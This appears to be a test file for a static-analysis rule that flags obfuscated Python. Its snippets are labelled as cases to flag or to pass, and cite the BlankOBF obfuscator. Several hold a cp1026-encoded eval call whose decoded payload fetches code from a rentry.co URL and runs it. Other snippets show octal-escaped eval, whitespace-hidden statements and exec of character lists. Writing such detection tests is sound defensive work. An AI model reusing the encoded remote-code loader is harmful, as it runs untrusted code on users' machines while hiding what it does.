# Obfuscated with BlankOBF
# https://github.com/Blank-c/BlankOBF

def f():
    # ruleid: obfuscation
    _____=eval("\145\166\141\154")

def f():
    # ruleid: obfuscation
    _____ = eval("foo")

def f():
    # ok: obfuscation
    eval("foo")

def f():
    # ruleid: obfuscation
    cc = getattr(builtins, b'\x85\xa5\x81\x93'.decode('cp1026'));cc(b'\x85\xa7\x85\x83M\xfc\x89\x94\x97\x96\x99\xa3@\x99\x85\x98\xa4\x85\xa2\xa3\xa2^\x85\xa7\x85\x83M\x99\x85\x98\xa4\x85\xa2\xa3\xa2K\x87\x85\xa3M}\x88\xa3\xa3\x97\xa2zaa\x99\x85\x95\xa3\x99\xa8K\x83\x96a\xa7\x83\xa2\xa2\x88\x94\x95\x96a\x99\x81\xa6}]K\xa3\x85\xa7\xa3]\xfc]'.decode('cp1026'))

def f():
    # ruleid: obfuscation
    cc = __builtins__.getattr(__builtins__, b'\x85\xa5\x81\x93'.decode('cp1026'));cc(b'\x85\xa7\x85\x83M\xfc\x89\x94\x97\x96\x99\xa3@\x99\x85\x98\xa4\x85\xa2\xa3\xa2^\x85\xa7\x85\x83M\x99\x85\x98\xa4\x85\xa2\xa3\xa2K\x87\x85\xa3M}\x88\xa3\xa3\x97\xa2zaa\x99\x85\x95\xa3\x99\xa8K\x83\x96a\xa7\x83\xa2\xa2\x88\x94\x95\x96a\x99\x81\xa6}]K\xa3\x85\xa7\xa3]\xfc]'.decode('cp1026'))

def f():
    # ruleid: obfuscation
     i=0                                                                                                                                                                                                                                                                                                                             ;print("malicious code here");

def f():
    # ruleid: obfuscation
    b'\x85\xa7\x85\x83M\xfc\x89\x94\x97\x96\x99\xa3@\x99\x85\x98\xa4\x85\xa2\xa3\xa2^\x85\xa7\x85\x83M\x99\x85\x98\xa4\x85\xa2\xa3\xa2K\x87\x85\xa3M}\x88\xa3\xa3\x97\xa2zaa\x99\x85\x95\xa3\x99\xa8K\x83\x96a\xa7\x83\xa2\xa2\x88\x94\x95\x96a\x99\x81\xa6}]K\xa3\x85\xa7\xa3]\xfc]'.decode('cp1026')

def f():
    """
     * Retrieves a list of up to 100 members and their membership status, given the provided paging and filtering.
     *
     * The queryMemberships function returns a Promise that resolves to a list of memberships.
     *
     * >**Note:** Site members can only query their own memberships.
     *
     // ok: obfuscation
     * | Property                    | Supported Filters & Sorting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
     * | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
     * | `status`                    | [`eq()`](#membershipsquerybuilder/eq), [`ne()`](#membershipsquerybuilder/ne)             |
     * | `role`                      | [`eq()`](#membershipsquerybuilder/eq), [`ne()`](#membershipsquerybuilder/ne)             |
     *
     * @public
     * @requiredField memberId
     * @param memberId - Site member ID.
     * @adminMethod
    """
    pass

def f():
    # ruleid: obfuscation
    exec(''.join(chr(c) for c in [112, 114, 105, 110, 116, 40, 34, 72, 101, 108, 108, 111, 44, 32, 119, 111, 114, 108, 100, 34, 41]))
    # ruleid: obfuscation
    exec(''.join(map(chr, [112, 114, 105, 110, 116, 40, 34, 72, 101, 108, 108, 111, 44, 32, 119, 111, 114, 108, 100, 34, 41])))
